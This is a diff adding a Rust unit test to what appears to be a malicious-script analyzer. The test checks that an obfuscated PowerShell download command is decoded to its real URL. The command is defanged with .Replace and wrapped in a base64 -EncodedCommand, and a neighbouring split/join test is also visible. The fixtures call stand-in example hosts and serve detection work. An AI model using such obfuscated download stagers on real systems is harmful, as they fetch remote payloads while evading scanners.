@@ -10315,6 +10315,30 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_double_quoted_replace_literal_resolves_url() {
+        use base64::Engine;
+        let inner = r#"Invoke-WebRequest -Uri ("hxxps://ps-dot-replace-dq.example/stage".Replace("xx","tt"))"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-dot-replace-dq.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "PowerShell double-quoted literal .Replace URL was not deobfuscated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn ps1_split_join_literal_resolves_url() {
         use base64::Engine;
         let inner = r#"Invoke-WebRequest -Uri (('h,t,t,p,s,:,/,/,ps-splitjoin.example,/stage' -split ',') -join '')"#;
